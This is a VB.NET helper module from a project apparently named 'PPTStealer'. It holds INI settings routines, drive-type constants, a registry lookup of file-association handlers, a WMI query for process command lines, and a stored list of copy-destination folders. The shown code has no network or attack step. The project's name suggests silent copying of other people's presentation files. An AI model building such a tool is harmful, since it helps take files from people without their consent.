Imports System.IO
Imports System.Management
Imports System.Runtime.InteropServices

Module Module1
    Public Declare Function GetDriveType Lib "kernel32" Alias "GetDriveTypeA" (ByVal nDrive As String) As Long
    Public Const DRIVE_UNKNOWN = 0
    Public Const DRIVE_NO_ROOT_DIR = 1
    Public Const DRIVE_REMOVABLE = 2
    Public Const DRIVE_FIXED = 3
    Public Const DRIVE_REMOTE = 4
    Public Const DRIVE_CDROM = 5
    Public Const DRIVE_RAMDISK = 6

    Public copy_to_disk As Boolean
    Public disk_save_paths As List(Of String)

    <DllImport("kernel32")>
    Public Function WritePrivateProfileString(ByVal section As String, ByVal key As String, ByVal val As String, ByVal filePath As String) As Long
    End Function
    <DllImport("kernel32")>
    Public Function WritePrivateProfileString(ByVal section As String, ByVal val As String, ByVal filePath As String) As Long
    End Function

    Public Declare Function GetPrivateProfileString Lib "kernel32" Alias "GetPrivateProfileStringA" (
        ByVal lpApplicationName As String,
        ByVal lpKeyName As String,
        ByVal lpDefault As String,
        ByVal lpReturnedString As String,
        ByVal nSize As Integer,
        ByVal lpFileName As String) As Integer
    Public Function GetKeyValue(ByVal sectionName As String,
                                 ByVal keyName As String,
                                ByVal defaultText As String,
                                 ByVal filename As String) As String
        Dim Rvalue As Integer
        Dim BufferSize As Integer
        BufferSize = 255
        Dim keyValue As String
        keyValue = Space(BufferSize)
        Rvalue = GetPrivateProfileString(sectionName, keyName, "", keyValue, BufferSize, filename)
        If Rvalue = 0 Then
            keyValue = defaultText
        Else
            keyValue = GetIniValue(keyValue)
        End If
        Return keyValue
    End Function
    Public Function GetIniValue(ByVal msg As String) As String
        Dim PosChr0 As Integer
        PosChr0 = msg.IndexOf(Chr(0))
        If PosChr0 <> -1 Then msg = msg.Substring(0, PosChr0)
        Return msg
    End Function
    Public Function SetValue(ByVal Section As String, ByVal Key As String, ByVal Value As String, ByVal iniFilePath As String) As Boolean
        Dim pat = Path.GetDirectoryName(iniFilePath)

        If Directory.Exists(pat) = False Then
            Directory.CreateDirectory(pat)
        End If

        If File.Exists(iniFilePath) = False Then
            File.Create(iniFilePath).Close()
        End If

        Dim OpStation As Long = WritePrivateProfileString(Section, Key, Value, iniFilePath)

        If OpStation = 0 Then
            Return False
        Else
            Return True
        End If
    End Function

    Public ini_path = Environment.GetEnvironmentVariable("LocalAppData") + "\PPTStealer\settings.ini"

    Public Function GetTypeFilePath(ByVal mType As String)
        mType = mType.Trim
        If mType.Substring(0, 1) <> "." Then mType = "." & mType
        Dim Key As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.ClassesRoot.OpenSubKey(mType)
        Dim Result As String = ""
        If Not Key Is Nothing Then
            Dim SubKeyValue As Object
            Dim Value As String
            SubKeyValue = Key.GetValue("")
            If Not SubKeyValue Is Nothing Then
                Value = SubKeyValue.ToString
                Dim SubKey As Microsoft.Win32.RegistryKey, ResultKey As Microsoft.Win32.RegistryKey
                SubKey = Microsoft.Win32.Registry.ClassesRoot.OpenSubKey(Value)
                If Not SubKey Is Nothing Then
                    ResultKey = SubKey.OpenSubKey("shell\open\command\", False)
                    If Not ResultKey Is Nothing Then
                        Result = ResultKey.GetValue("").ToString
                    End If
                End If
            End If
        End If
        Return Result
    End Function

    Public Function GetCommandLine(ByVal process As Process) As String
        Dim cmdLine As String = Nothing

        Using searcher = New ManagementObjectSearcher($"SELECT CommandLine FROM Win32_Process WHERE ProcessId = {process.Id}")

            Using matchEnum = searcher.[Get]().GetEnumerator()

                If matchEnum.MoveNext() Then
                    cmdLine = matchEnum.Current("CommandLine")?.ToString()
                End If
            End Using
        End Using

        If cmdLine Is Nothing Then
            cmdLine = ""
            'Dim dummy = process.MainModule
        End If

        Return cmdLine
    End Function

    Public Function calc_exe_path(ByVal open_path As String) As String
        If open_path.Substring(0, 1) = """" Then
            Dim p As Integer = open_path.IndexOf("""", 1)
            Return open_path.Substring(1, p - 1)
        Else
            Dim p As Integer = open_path.IndexOf(" ")
            Return open_path.Substring(0, p)
        End If
    End Function

    Public Function smooth(ByVal x As Double) As Double
        Dim a As Double = 15
        Dim b As Double = sigmoid(-a / 2)
        Return (sigmoid(a * (x - 0.5)) - b) / (1 - 2 * b)
    End Function

    Public Function sigmoid(ByVal x As Double) As Double
        Return 1 / (1 + Math.Exp(-x))
    End Function

    Public Sub read_settings()
        Dim cnt As Int32 = CInt(GetKeyValue("disk_save", "count", "0", ini_path))
        For i As Int32 = 1 To cnt
            Dim p As String = GetKeyValue("disk_save", "path" & CStr(i), "", ini_path)
            If IO.Directory.Exists(p) Then
                disk_save_paths.Add(p)
            End If
        Next
        'copy_to_disk = CBool(GetKeyValue("disk_save", "enabled", "false", ini_path))
    End Sub

    Public Sub save_settings()
        SetValue("disk_save", "count", CStr(disk_save_paths.Count), ini_path)
        For i = 1 To disk_save_paths.Count
            SetValue("disk_save", "path" & CStr(i), disk_save_paths(i - 1), ini_path)
        Next
    End Sub
End Module
